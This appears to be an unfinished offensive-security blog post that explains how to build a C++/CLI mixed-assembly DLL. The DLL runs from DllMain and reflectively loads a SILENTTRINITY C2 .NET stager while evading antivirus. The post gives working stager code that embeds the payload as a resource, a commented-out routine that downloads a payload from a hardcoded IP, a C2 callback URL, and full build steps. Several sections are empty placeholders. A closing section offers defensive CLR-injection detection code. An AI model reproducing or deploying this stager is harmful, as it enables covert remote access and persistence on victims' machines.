---
layout: post
title: Mixed Assemblies - Crafting Flexible C++ Reflective Stagers for .NET Assemblies
---

*TLDR: There is not only one type of CLR Injection. You can compile C++ with the /clr option to produce Mixed Assemblies, programs that contain both native and managed code. This can be used to reflectively load .NET Assemblies using native(ish) stagers.*

# Advancing Tradecraft - Context

There is a fundamental flaw with using .NET Assemblies as the unit of execution for offensive payloads: They are reversible to source code. Rather than being compiled to machine code, they are assembled to the Common Intermediate Language (CIL), an object-oriented assembly language that is designed to support the functionality of every common hardware platform and their corresponding Instruction Set Architecture (ISA). CIL is compiled Just-In-Time for execution by .NET's runtime environment, the Common Language Runtime. Machine code (such as x86-64 or ARM) can certainly be reverse-engineered. However, by simply knowing the machine code you may not neccessarily determine the original source code. That is not the case for .NET Assemblies. They contain both their managed code, and the metadeta about that code. As such, they are trivial to reverse engineer and for static analyzers to detect and describe.

## Advantages of Native Code

Using native (unmanaged) languages such as C and C++ provide several significant advantages for offensive tooling. Namely:

* The code they produce can run directly on the hardware of the machine running it. Other than a loader, no additional interpretation is required to execute native code.
* Native code cannot (reliably) be directly decompiled to the exact source code used to create it. Sure, there are decompilers (HexRays, Ghidra, etc.). But their output is only a best guess at the original code, not a copy. Dissassembly and decompilation of machine code presents many challenges, especially when done at scale accross an enterprise where many programs are run ad-hoc by users. This slows down the time involved in capturing and reverse engineering payloads, especially when advanced cryptors, packers, or obfuscators are used to protect the payload.
* 

## Advantages of Managed (.NET) Code

* Compatability: 
* Interoperability:
* Capability:

## Why Not Both?

### C++/CLI

When Visual Studios builds a C++/CLI program, it produces what is called a [Mixed Assembly](https://docs.microsoft.com/en-us/cpp/dotnet/mixed-native-and-managed-assemblies?view=vs-2019).

### Moving Between Managed and Native Code

### Mixed Assemblies - Both & Neither

Mixed Assemblies are at the same time, both a native PE file and a .NET Assembly, while also not completely being either. Let me explain...

On one hand, Mixed Assemblies contain native code and use the PE format. As such, you could try to think of them as normal unmanaged PE executables. On the other hand, they also contain managed code and use the .NET Assembly's extension of the PE-COFF format. If you try to use them like normal PE files, then they will usually work. If you try to use them as normal .NET Assemblies, they will probably not work.

So, you should probably not think of them as either one, and instead just consider them *their own thing.*

### How They (Don't) Work with the Reflection API

Calling a Mixed Assembly an "Assembly" is a bit misleading. If it were just an Assembly, then you could load it using the Reflection API and Assembly.Load. However, that will not work. That is the major con of using Mixed Assemblies. While they can certainly be loaded reflectively (just like any other unmanaged EXE or DLL)

# A Case Study

A friend of mine was working on a persistence tool. Once it does its thang, the result is that an attacker's DLL is loaded from disk. For that capabilitiy to be useful, you need to craft a DLL that implements ```DLLMain```. That way, your malicious code will run when the DLL is loaded with ```LoadLibrary```. For his demonstration of the tool, he wanted to be able to load SILENTTRINITY (mostly because it's cool). Well, that produces a challenge. SILENTTRINITY is a a .NET-based C2 Framework. Its stager takes the form of a managed EXE or DLL that is usually loaded from memory through Assembly.Load(). But C# (the .NET language used by SILENTTRINITY) does not provide a functionality comparable to ```DLLMain```. Sure, there are some hacky ways to accomplish something similar, but they are as I mentioned: a bit hacky. And, because there's a ```.export``` keyword in the Common Intermediate Language, you can dissassemble .NET Assemblies written in C#, modify one of their functions to be exported in a similar way to C/C++, and then reassemble the .NET Assembly before it is executed. But that requires you to modify each .NET Assembly payload before you use it. Which is annoying, so let's not. And even [if you did that automatically](https://www.codeproject.com/Articles/37675/Simple-Method-of-DLL-Export-without-C-CLI), then you would have to drop a raw, unwrapped SILENTTRINITY DLL to disk, which is just asking to be detected by AV. As an alternative, let's see if we can design something that avoids these problems.

As any good engineering project goes, we'll start with stating our requirements. Whatever the solution, it:

* Must be an on-disk DLL
* Must not require user interaction
* Must run our malicious code when loaded (through DllMain)
* Must execute a stager for our .NET Remote Access Tool
* Ideally, would execute stager from memory without needing any other file(s)
* Ideally, could download stager from URL before executing it
* Ideally, would somehow obfusctate our suspicious code.

## Our Solution

One of the ways to load .NET Assemblies through unmanaged code is to use C++/CLI. What is that, you may ask? It is Visual C++ that can be compiled to CIL rather than native machine code. You may specify that code is either managed or native. Native code is written the same as normal C++. The managed version, however, uses a different syntax. To compile managed C++, you must use the /clr option on the Visual Studios compiler. 

TODO:

* Put our hardcoded values into a header file
* Create a new solution for it. Clean it up.
* Show how to embed binary files as resources
* Clean out the Manager repo

### Concept

### Implementation

#### The Unmanaged Code

```cpp
// dllmain.cpp : Defines the entry point for the DLL application.
#define WIN32_LEAN_AND_MEAN
#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include "resource.h"
extern void LaunchDll(
	unsigned char *dll, size_t dllLength,
	char const *className, char const *methodName);
static DWORD WINAPI launcher(void* h)
{

	std::cout << "Created thread...";

	HRSRC res = ::FindResourceA(static_cast<HMODULE>(h),
		MAKEINTRESOURCEA(IDR_DLLENCLOSED6), "DLLENCLOSED");
	if (res)
	{
		HGLOBAL dat = ::LoadResource(static_cast<HMODULE>(h), res);
		if (dat)
		{
			unsigned char *dll =
				static_cast<unsigned char*>(::LockResource(dat));
			if (dll)
			{
				size_t len = SizeofResource(static_cast<HMODULE>(h), res);
				LaunchDll(dll, len, "ST", "Main");
			}
		}
	}
	return 0;
}
extern "C" BOOL APIENTRY DllMain(HMODULE h, DWORD reasonForCall, void* resv)
{
	if (reasonForCall == DLL_PROCESS_ATTACH)
	{
		CreateThread(0, 0, launcher, h, 0, 0);
	}
	return TRUE;
}

```

#### The Managed Code

Let's get this out of the way: C++/CLI is ugly. It's disgusting. It's hideous. Look at that monstrosity of syntax below.

```cpp
#using <mscorlib.dll>
#include "stdafx.h"
#using <System.dll>

// Load a managed DLL from a byte array and call a static method in the DLL.
// dll - the byte array containing the DLL
// dllLength - the length of 'dll'
// className - the name of the class with a static method to call.
// methodName - the static method to call. Must expect no parameters.
void LaunchDll(
	unsigned char *dll, size_t dllLength,
	char const *className, char const *methodName)
{
	// convert passed in parameter to managed values
	cli::array<unsigned char>^ mdll = gcnew cli::array<unsigned char>(dllLength);

	System::Runtime::InteropServices::Marshal::Copy(
		(System::IntPtr)dll, mdll, 0, mdll->Length);
	System::String^ cn =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr)(char*)className);
	System::String^ mn =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr)(char*)methodName);

	/**
	/Downloads the Assembly from a hardcoded URI. Comment out the stuff above.
	
	System::Net::WebClient ^_client = gcnew System::Net::WebClient();

	System::String ^uri = "http://192.168.197.133:8000/SILENTTRINITY_DLL.dll";

	System::Console::WriteLine("Downloading payload from: " + uri);

	cli::array<unsigned char>^ mdll = _client->DownloadData(uri);
	**/

	// used the converted parameters to load the DLL, find, and call the method.
	System::String^ args =
		System::Runtime::InteropServices::Marshal::PtrToStringAnsi(
		(System::IntPtr)(char*)"http://192.168.197.134:80");

	array< System::Object^ >^ arr = gcnew array< System::Object^ >(1);
	arr[0] = args;

	System::Reflection::Assembly^ a = System::Reflection::Assembly::Load(mdll);
	a->GetType(cn)->GetMethod(mn)->Invoke(nullptr, arr);
}
```

But, anyway, it works. Allow me to explain:

#### WTF?



### Getting Visual Studios to Cooperate

It takes a bit of convincing to get Visual Studios to use C++/CLI. Just inserting the code above into a project will result in compiler errors. As such, follow the guide below to ensure that your project can compile:

If you are using a new project and want to add a new managed code .cpp, you must change some settings in Visual Studio. 1. 

1. Create a .cpp Source File like normal.
2. Right click on it in the Solution Explorer and click Properties.
3. Go to Configuration Properties > C/C++ > General > Common Language RunTime Support and select the "Common Language RunTime Support /clr" option. Do this for both Debug and Release Mode.
4. In debug mode, open the Properties for the file like above. Navigate to Properties > C/C++ > General > Debug Information Format and select the "None" option.
5. In both Debug and Release mode, open the Properties for the file like above. Navigate to Properties > C/C++ > Code Generation > Enable C++ Exceptions and select "No".
6. Follow the instructions in this article to disable Runtime Checking for Debug mode: https://gregs-blog.com/2007/12/31/how-to-fix-visual-studio-bug-rtc1-and-clr-options-are-incompatible/
7. In both Debug and Release mode, open the Properties for the file like above. Navigate to Properties > C/C++ > Precompiled Header option and select "Not using Precompiled Headers".
8. The build should now succeed.
9. Test loading the DLL with the DemoLoad program.

### Staged or Stageless?

Instructions for how to add a payload as a resource with Visual Studios.

1. Create a solution as a Visual C++ project in Visual Studios.
2. Right click "Resource Files" in the Solution Explorer and select Add > Resource...
3. Click the Import... button.
4. Browse to the DLL or EXE you wish to use as a payload. Make sure to select All Files in the File Types of the File Browser.
5. A popup will appear that asks you what type of resource it is. You can choose whatever name you want for the type. For the tutorial, we will use "DLLENCLOSED" for DLLs, and "EXEENCLOSED" for EXEs. Click OK.
6. There should now be a resource of type DLLENCLOSED. By default, it will be named IDR_DLLENCLOSED1. It will be embedded into your built DLL or EXE within the .rsrc PE section.
5. Open the main.cpp source file. Make sure that the type and name in in the FindResourceA() function call reflect the correct resource name and type. To confirm the name and type of the resource, open the .rc file under Resource Files in the Solution Explorer and look at the left-hand pane.
6. The resource should now be embedded. It will be passed to the Assembly.Load function in a raw byte[] format.

#### Creating a Testing Program

TestLoad

#### Testing the Stager

### How Could This Be Extended?

As an EXE. As a reflective DLL.

## OPSec

## Opening it Up in dnSpy

## Bypassing AMSI in .NET v4.8

## Detecting CLR Injection

If you have been reading my blog posts about Donut, you may be familiar with ModuleMonitor. It uses WMI Event Win32_ModuleLoadTrace to monitor for module loading. For each module that is loaded, it captures information about the process that loaded the module.

IT has a "CLR Sentry" option that follows some simple logic: If a process loads the CLR, but the program is not a .NET Assembly, then a CLR has been injected into it. This technique can be used to detect C++/CLI stagers for .NET Assemblies. Unfortunately, this means that it will detect ALL programs written in C++/CLI as malicious because they are all represented as Mixed Assemblies.

ModuleMonitor uses the following implementation of this logic in C#. The full code can be found in the ModuleMonitor repo.

```csharp
//CLR Sentry
//Author: TheWover
 while (true)
        {
            //Get the module load.
            Win32_ModuleLoadTrace trace = GetNextModuleLoad();

            //Split the file path into parts delimited by a '\'
            string[] parts = trace.FileName.Split('\\');

            //Check whether it is a .NET Runtime DLL
            if (parts[parts.Length - 1].Contains("msco"))
            {
                //Get a 
                Process proc = Process.GetProcessById((int) trace.ProcessID);

                //Check if the file is a .NET Assembly
                if (!IsValidAssembly(proc.StartInfo.FileName))
                {
                    //If it is not, then the CLR has been injected.
                    Console.WriteLine();

                    Console.WriteLine("[!] CLR Injection has been detected!");

                    //Display information from the event
                    Console.WriteLine("[>] Process {0} has loaded the CLR but is not a .NET Assembly:", trace.ProcessID);
                }
            }
        }
```

When the detection is successful, you should get a detection that looks like the following.

![_config.yml]({{ site.baseurl }}/images/Introducing_Donut/detected.png)

It is important to note that this behaviour represents all CLR Injection techniques, of which there are several. This detection should work for donut, as well as other tools such as Cobalt Strike's 'execute-assembly' command.

## OpSec Considerations

# Conclusion
